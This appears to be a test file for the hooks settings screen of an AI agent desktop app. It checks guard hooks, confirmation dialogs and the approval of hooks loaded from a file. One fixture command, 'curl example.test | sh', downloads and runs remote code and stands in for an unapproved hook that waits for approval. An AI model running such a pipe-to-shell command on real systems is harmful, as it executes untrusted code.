import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { open } from '@tauri-apps/plugin-dialog';
import { readTextFile } from '@tauri-apps/plugin-fs';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { hooks } from '@agiworkforce/desktop-command-client';

const mocks = vi.hoisted(() => ({
  hooks: {
    hooksInitialize: vi.fn(),
    hooksList: vi.fn(),
    hooksGetEventTypes: vi.fn(),
    hooksAdd: vi.fn(),
    hooksUpdate: vi.fn(),
    hooksRemove: vi.fn(),
    hooksToggle: vi.fn(),
    hooksGetStats: vi.fn(),
    hooksWaitingForApproval: vi.fn(),
    hooksExport: vi.fn(),
    hooksImport: vi.fn(),
    hooksReload: vi.fn(),
  },
}));

vi.mock('@agiworkforce/desktop-command-client', async (importOriginal) => ({
  ...(await importOriginal<DesktopCommandClientModule>()),
  hooks: mocks.hooks,
}));

import {
  HooksSettings,
  draftProblem,
  runSummary,
  guardFailureNote,
  guardsLeftOff,
  waitingSummary,
} from '../HooksSettings';

type DesktopCommandClientModule = typeof import('@agiworkforce/desktop-command-client');

const existing: hooks.Hook = {
  name: 'lint-on-write',
  events: ['PostToolUse'],
  priority: 50,
  command: 'pnpm lint',
  enabled: true,
  timeout_secs: 30,
  env: [],
  continue_on_error: true,
};

const guard: hooks.Hook = {
  ...existing,
  name: 'no-force-push',
  events: ['PreToolUse'],
  command: 'check-branch',
  continue_on_error: false,
};

describe('HooksSettings', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mocks.hooks.hooksInitialize.mockResolvedValue('ok');
    mocks.hooks.hooksList.mockResolvedValue([existing]);
    mocks.hooks.hooksGetEventTypes.mockResolvedValue(['PreToolUse', 'PostToolUse', 'ToolError']);
    mocks.hooks.hooksAdd.mockResolvedValue('added');
    mocks.hooks.hooksToggle.mockResolvedValue('toggled');
    mocks.hooks.hooksRemove.mockResolvedValue('removed');
    mocks.hooks.hooksGetStats.mockResolvedValue(null);
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue(null);
    mocks.hooks.hooksExport.mockResolvedValue('/tmp/backup/hooks.yaml');
    mocks.hooks.hooksImport.mockResolvedValue('imported');
    mocks.hooks.hooksReload.mockResolvedValue('reloaded');
    vi.mocked(open).mockReset();
    vi.mocked(readTextFile).mockReset();
  });

  it('initializes the registry before listing hooks', async () => {
    render(<HooksSettings isTauriHost />);
    expect(await screen.findByText('lint-on-write')).toBeInTheDocument();
    expect(mocks.hooks.hooksInitialize).toHaveBeenCalled();
    expect(screen.getByText('pnpm lint')).toBeInTheDocument();
  });

  it('adds a hook with the shape the Rust command expects', async () => {
    const user = userEvent.setup();
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Add hook' }));
    await user.type(screen.getByLabelText('Name'), 'audit');
    await user.click(screen.getByLabelText('PreToolUse'));
    await user.type(screen.getByLabelText('Command'), 'echo "$HOOK_EVENT_TYPE"');
    await user.click(screen.getAllByRole('button', { name: 'Add hook' }).at(-1)!);

    await waitFor(() =>
      expect(mocks.hooks.hooksAdd).toHaveBeenCalledWith({
        name: 'audit',
        events: ['PreToolUse'],
        priority: 50,
        command: 'echo "$HOOK_EVENT_TYPE"',
        enabled: true,
        timeout_secs: 30,
        continue_on_error: false,
      }),
    );
  });

  it('starts a new hook unticked and says what blocks whichever way it is set', async () => {
    const user = userEvent.setup();
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');
    await user.click(screen.getByRole('button', { name: 'Add hook' }));

    const keepGoing = screen.getByRole('checkbox', {
      name: 'Keep going when this hook exits with an error',
    });
    expect(keepGoing).not.toBeChecked();
    expect(keepGoing).toHaveAccessibleDescription(
      /Unticked: an error exit blocks the tool or message.*Exit code 2 blocks either way, and so does a PreToolUse or UserPromptSubmit hook that cannot start, runs out of time or is killed/,
    );

    await user.click(keepGoing);

    expect(keepGoing).toHaveAccessibleDescription(
      /Ticked: an error exit is logged and the tool or message goes ahead.*Exit code 2 blocks either way, and so does a PreToolUse or UserPromptSubmit hook that cannot start, runs out of time or is killed/,
    );
  });

  it('keeps the stored choice of a saved hook when it is edited', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksUpdate.mockResolvedValue('updated');
    render(<HooksSettings isTauriHost />);
    await user.click(await screen.findByRole('button', { name: 'Edit lint-on-write' }));

    expect(
      screen.getByRole('checkbox', { name: 'Keep going when this hook exits with an error' }),
    ).toBeChecked();
    await user.click(screen.getByRole('button', { name: 'Save hook' }));

    await waitFor(() =>
      expect(mocks.hooks.hooksUpdate).toHaveBeenCalledWith(
        expect.objectContaining({ name: 'lint-on-write', continue_on_error: true }),
      ),
    );
  });

  it('says in the list that a guard blocks when it does not run to the end', () => {
    expect(
      guardFailureNote({ ...existing, events: ['PreToolUse'], continue_on_error: false }),
    ).toBe(
      'Blocks the tool or message if it cannot start, runs out of time, is killed or exits with an error.',
    );
    expect(
      guardFailureNote({ ...existing, events: ['UserPromptSubmit'], continue_on_error: true }),
    ).toBe(
      'Blocks the tool or message if it cannot start, runs out of time or is killed. An error exit other than 2 is let through.',
    );
    expect(guardFailureNote(existing)).toBeNull();
  });

  it('counts a guard as left off when it is gone, switched off or moved off both gating events', () => {
    const offGuard = { ...guard, name: 'off', enabled: false };
    expect(guardsLeftOff([guard, existing, offGuard], [])).toEqual([guard]);
    expect(guardsLeftOff([guard], [{ ...guard, enabled: false }])).toEqual([guard]);
    expect(guardsLeftOff([guard], [{ ...guard, events: ['PostToolUse'] }])).toEqual([guard]);
    const rewritten: hooks.Hook = { ...guard, command: 'true' };
    expect(guardsLeftOff([guard], [rewritten])).toEqual([]);
  });

  it('asks before turning a guard off and says what stops being checked', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([guard]);
    render(<HooksSettings isTauriHost />);

    await user.click(await screen.findByRole('switch', { name: 'Turn off no-force-push' }));

    const dialog = await screen.findByRole('alertdialog');
    expect(mocks.hooks.hooksToggle).not.toHaveBeenCalled();
    expect(dialog).toHaveTextContent('Turn off the guard "no-force-push"?');
    expect(dialog).toHaveTextContent(
      '"no-force-push" stops checking tool calls before they go ahead',
    );
    expect(dialog).toHaveTextContent('A system dialog asks you once more');

    await user.click(within(dialog).getByRole('button', { name: 'Turn off guard' }));

    await waitFor(() =>
      expect(mocks.hooks.hooksToggle).toHaveBeenCalledWith('no-force-push', false),
    );
  });

  it('turns a guard on without asking', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([{ ...guard, enabled: false }]);
    render(<HooksSettings isTauriHost />);

    await user.click(await screen.findByRole('switch', { name: 'Turn on no-force-push' }));

    await waitFor(() =>
      expect(mocks.hooks.hooksToggle).toHaveBeenCalledWith('no-force-push', true),
    );
    expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument();
  });

  it('says what stops being checked before removing a guard', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([guard]);
    render(<HooksSettings isTauriHost />);

    await user.click(await screen.findByRole('button', { name: 'Remove no-force-push' }));

    const dialog = await screen.findByRole('alertdialog');
    expect(dialog).toHaveTextContent(
      '"no-force-push" stops checking tool calls before they go ahead',
    );
    expect(mocks.hooks.hooksRemove).not.toHaveBeenCalled();
  });

  it('asks before an edit moves a guard off the events it guards', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([guard]);
    mocks.hooks.hooksUpdate.mockResolvedValue('updated');
    render(<HooksSettings isTauriHost />);
    await user.click(await screen.findByRole('button', { name: 'Edit no-force-push' }));

    await user.click(screen.getByRole('checkbox', { name: 'PreToolUse' }));
    await user.click(screen.getByRole('checkbox', { name: 'PostToolUse' }));
    await user.click(screen.getByRole('button', { name: 'Save hook' }));

    const dialog = await screen.findByRole('alertdialog');
    expect(dialog).toHaveTextContent('Stop "no-force-push" from guarding?');
    expect(mocks.hooks.hooksUpdate).not.toHaveBeenCalled();

    await user.click(within(dialog).getByRole('button', { name: 'Save and stop guarding' }));

    await waitFor(() =>
      expect(mocks.hooks.hooksUpdate).toHaveBeenCalledWith(
        expect.objectContaining({ name: 'no-force-push', events: ['PostToolUse'] }),
      ),
    );
  });

  it('asks before approving a file that no longer lists an armed guard', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([guard]);
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue({
      hooks: [],
      problem: null,
      holdsTools: false,
    });
    render(<HooksSettings isTauriHost />);

    await user.click(await screen.findByRole('button', { name: 'Approve' }));

    const dialog = await screen.findByRole('alertdialog');
    expect(dialog).toHaveTextContent('Approve a file that stops a guard?');
    expect(dialog).toHaveTextContent('"no-force-push" stops checking tool calls');
    expect(mocks.hooks.hooksReload).not.toHaveBeenCalled();

    await user.click(within(dialog).getByRole('button', { name: 'Approve and stop guarding' }));

    await waitFor(() => expect(mocks.hooks.hooksReload).toHaveBeenCalledTimes(1));
  });

  it('toggles a hook through hooks_toggle', async () => {
    const user = userEvent.setup();
    render(<HooksSettings isTauriHost />);
    await user.click(await screen.findByRole('switch', { name: 'Turn off lint-on-write' }));
    await waitFor(() =>
      expect(mocks.hooks.hooksToggle).toHaveBeenCalledWith('lint-on-write', false),
    );
  });

  it('asks before removing a hook and names what stops', async () => {
    const user = userEvent.setup();
    render(<HooksSettings isTauriHost />);
    await user.click(await screen.findByRole('button', { name: 'Remove lint-on-write' }));
    expect(mocks.hooks.hooksRemove).not.toHaveBeenCalled();
    expect(await screen.findByText(/stops running on PostToolUse/)).toBeInTheDocument();
    await user.click(screen.getByRole('button', { name: 'Remove hook' }));
    await waitFor(() => expect(mocks.hooks.hooksRemove).toHaveBeenCalledWith('lint-on-write'));
  });

  it('says nothing about approval when no hook waits', async () => {
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    expect(screen.queryByText('Hooks are waiting for your approval')).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Add hook' })).toBeEnabled();
  });

  it('shows the hooks that wait, holds changes back, and arms them on Approve', async () => {
    const user = userEvent.setup();
    const unapproved = { ...existing, name: 'from-disk', command: 'curl example.test | sh' };
    mocks.hooks.hooksList.mockResolvedValue([]);
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue({
      hooks: [unapproved],
      problem: null,
      holdsTools: true,
    });
    render(<HooksSettings isTauriHost />);

    expect(
      await screen.findByRole('heading', { name: 'Hooks are waiting for your approval' }),
    ).toBeInTheDocument();
    expect(screen.getByText('curl example.test | sh')).toBeInTheDocument();
    expect(
      screen.getByText(
        /none of its 1 hook runs, and tools and messages are held until you approve/,
      ),
    ).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Add hook' })).toBeDisabled();
    expect(screen.getByRole('button', { name: 'Import' })).toBeDisabled();

    mocks.hooks.hooksList.mockResolvedValue([unapproved]);
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue(null);
    await user.click(screen.getByRole('button', { name: 'Approve' }));

    await waitFor(() => expect(mocks.hooks.hooksReload).toHaveBeenCalledTimes(1));
    expect(await screen.findByRole('status')).toHaveTextContent('Approved. These hooks now run.');
    expect(
      screen.queryByRole('heading', { name: 'Hooks are waiting for your approval' }),
    ).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Add hook' })).toBeEnabled();
  });

  it('keeps the hooks waiting when the approval is declined', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([]);
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue({
      hooks: [{ ...existing, name: 'from-disk' }],
      problem: null,
      holdsTools: false,
    });
    mocks.hooks.hooksReload.mockRejectedValue(
      new Error('Hooks were not reloaded: the commands were not confirmed'),
    );
    render(<HooksSettings isTauriHost />);

    await user.click(await screen.findByRole('button', { name: 'Approve' }));

    expect(await screen.findByRole('alert')).toHaveTextContent('were not confirmed');
    expect(
      screen.getByRole('heading', { name: 'Hooks are waiting for your approval' }),
    ).toBeInTheDocument();
  });

  it('keeps the approved hooks listed and locked while a changed file waits', async () => {
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue({
      hooks: [{ ...existing, name: 'from-disk', command: 'true' }],
      problem: null,
      holdsTools: false,
    });
    render(<HooksSettings isTauriHost />);

    expect(
      await screen.findByText(
        /none of its 1 hook runs, and the hooks you approved before keep running until you approve/,
      ),
    ).toBeInTheDocument();
    expect(screen.getByRole('switch', { name: 'Turn off lint-on-write' })).toBeDisabled();
    expect(screen.getByRole('button', { name: 'Edit lint-on-write' })).toBeDisabled();
    expect(screen.getByRole('button', { name: 'Remove lint-on-write' })).toBeDisabled();
    expect(screen.getByRole('button', { name: 'Reload from hooks.yaml' })).toBeEnabled();
  });

  it('shows why a file could not be read and offers no approval of it', async () => {
    mocks.hooks.hooksList.mockResolvedValue([]);
    mocks.hooks.hooksWaitingForApproval.mockResolvedValue({
      hooks: [],
      problem: 'Failed to load hook configuration: did not find expected node',
      holdsTools: true,
    });
    render(<HooksSettings isTauriHost />);

    expect(
      await screen.findByText(
        /could not be read, so nothing in it runs, and tools and messages are held\. Fix the file, then choose Reload from hooks\.yaml/,
      ),
    ).toBeInTheDocument();
    expect(screen.getByRole('alert')).toHaveTextContent('did not find expected node');
    expect(screen.queryByRole('button', { name: 'Approve' })).not.toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Reload from hooks.yaml' })).toBeEnabled();
  });

  it('says the approved hooks keep running when the file no longer lists any', () => {
    expect(waitingSummary({ hooks: [], problem: null, holdsTools: false }, 2)).toBe(
      'hooks.yaml no longer lists any hooks, and the hooks you approved before keep running until you approve the change.',
    );
  });

  it('shows how often a hook ran and how many runs failed', async () => {
    mocks.hooks.hooksGetStats.mockResolvedValue({
      totalRuns: 3,
      successCount: 2,
      failureCount: 1,
      avgDuration: 40,
      lastExecution: null,
    });
    render(<HooksSettings isTauriHost />);

    expect(await screen.findByText(/Ran 3 times since the app started/)).toBeInTheDocument();
    expect(screen.getByText(/1 run failed/)).toBeInTheDocument();
    expect(mocks.hooks.hooksGetStats).toHaveBeenCalledWith('lint-on-write');
  });

  it('says a hook has not run rather than showing zeroes', () => {
    expect(runSummary(null)).toEqual({
      text: 'Has not run since the app started.',
      failures: null,
    });
    expect(
      runSummary({
        totalRuns: 1,
        successCount: 1,
        failureCount: 0,
        avgDuration: 5,
        lastExecution: null,
      }),
    ).toEqual({ text: 'Ran 1 time since the app started.', failures: null });
  });

  it('reloads hooks.yaml and lists what is armed afterwards', async () => {
    const user = userEvent.setup();
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');
    mocks.hooks.hooksList.mockResolvedValue([{ ...existing, name: 'from-disk' }]);

    await user.click(screen.getByRole('button', { name: 'Reload from hooks.yaml' }));

    expect(await screen.findByText('from-disk')).toBeInTheDocument();
    expect(mocks.hooks.hooksReload).toHaveBeenCalledTimes(1);
    expect(screen.getByRole('status')).toHaveTextContent('Reloaded hooks.yaml.');
  });

  it('reports a reload the user did not confirm and keeps the list', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksReload.mockRejectedValue(
      new Error('Hooks were not reloaded: the commands were not confirmed'),
    );
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Reload from hooks.yaml' }));

    expect(await screen.findByRole('alert')).toHaveTextContent('were not confirmed');
    expect(screen.getByText('lint-on-write')).toBeInTheDocument();
  });

  it('leaves the export to the host, which picks the file and writes it', async () => {
    const user = userEvent.setup();
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Export' }));

    expect(await screen.findByRole('status')).toHaveTextContent('Exported 1 hook to hooks.yaml.');
    expect(mocks.hooks.hooksExport).toHaveBeenCalledTimes(1);
  });

  it('claims no export when the save dialog is cancelled', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksExport.mockResolvedValue(null);
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Export' }));

    await waitFor(() => expect(mocks.hooks.hooksExport).toHaveBeenCalled());
    expect(screen.queryByRole('status')).not.toBeInTheDocument();
  });

  it('shows each variable by name, with the value only in the form the host gives', async () => {
    mocks.hooks.hooksList.mockResolvedValue([
      {
        ...existing,
        env: [
          { name: 'API_TOKEN', shown: null },
          { name: 'LOG_LEVEL', shown: 'debug' },
        ],
      },
    ]);
    render(<HooksSettings isTauriHost />);

    expect(
      await screen.findByText('Environment: API_TOKEN (value not shown); LOG_LEVEL=debug'),
    ).toBeInTheDocument();
  });

  it('sends no environment when a hook is edited and says the host keeps it', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksUpdate.mockResolvedValue('updated');
    mocks.hooks.hooksList.mockResolvedValue([
      { ...existing, env: [{ name: 'API_TOKEN', shown: null }] },
    ]);
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Edit lint-on-write' }));
    expect(
      screen.getByText(
        'Its 1 environment variable stays as it is. To change it, edit hooks.yaml and reload.',
      ),
    ).toBeInTheDocument();
    await user.click(screen.getByRole('button', { name: 'Save hook' }));

    await waitFor(() => expect(mocks.hooks.hooksUpdate).toHaveBeenCalledTimes(1));
    expect(mocks.hooks.hooksUpdate.mock.calls[0]?.[0]).not.toHaveProperty('env');
  });

  it('has nothing to export when no hook exists', async () => {
    mocks.hooks.hooksList.mockResolvedValue([]);
    render(<HooksSettings isTauriHost />);

    expect(await screen.findByText('No hooks yet.')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Export' })).toBeDisabled();
  });

  it('asks before an import replaces the existing hooks, then imports the file', async () => {
    const user = userEvent.setup();
    vi.mocked(open).mockResolvedValue('/tmp/team/hooks.yaml');
    vi.mocked(readTextFile).mockResolvedValue('hooks: []\n');
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Import' }));

    const dialog = await screen.findByRole('alertdialog');
    expect(dialog).toHaveTextContent('Replace your 1 hook with the ones in hooks.yaml?');
    expect(dialog).toHaveTextContent('overwrites hooks.yaml');
    expect(mocks.hooks.hooksImport).not.toHaveBeenCalled();

    await user.click(within(dialog).getByRole('button', { name: 'Replace hooks' }));

    await waitFor(() => expect(mocks.hooks.hooksImport).toHaveBeenCalledWith('hooks: []\n'));
    expect(await screen.findByRole('status')).toHaveTextContent(
      'Imported the hooks in hooks.yaml.',
    );
  });

  it('imports straight away when there is nothing to replace', async () => {
    const user = userEvent.setup();
    mocks.hooks.hooksList.mockResolvedValue([]);
    vi.mocked(open).mockResolvedValue('/tmp/team/hooks.yaml');
    vi.mocked(readTextFile).mockResolvedValue('hooks: []\n');
    render(<HooksSettings isTauriHost />);
    await screen.findByText('No hooks yet.');

    await user.click(screen.getByRole('button', { name: 'Import' }));

    await waitFor(() => expect(mocks.hooks.hooksImport).toHaveBeenCalledWith('hooks: []\n'));
    expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument();
  });

  it('imports nothing when the file dialog is cancelled', async () => {
    const user = userEvent.setup();
    vi.mocked(open).mockResolvedValue(null);
    render(<HooksSettings isTauriHost />);
    await screen.findByText('lint-on-write');

    await user.click(screen.getByRole('button', { name: 'Import' }));

    await waitFor(() => expect(open).toHaveBeenCalled());
    expect(readTextFile).not.toHaveBeenCalled();
    expect(mocks.hooks.hooksImport).not.toHaveBeenCalled();
  });

  it('rejects incomplete drafts before calling Rust', () => {
    const draft = {
      name: 'x',
      events: [],
      command: 'true',
      timeoutSecs: '30',
      workingDir: '',
      continueOnError: true,
    };
    expect(draftProblem(draft, [])).toBe('Choose at least one event.');
    expect(draftProblem({ ...draft, events: ['PreToolUse'] }, ['x'])).toBe(
      'Another hook already uses this name.',
    );
    expect(draftProblem({ ...draft, events: ['PreToolUse'], timeoutSecs: '0' }, [])).toMatch(
      /Timeout/,
    );
    expect(draftProblem({ ...draft, events: ['PreToolUse'] }, [])).toBeNull();
  });
});
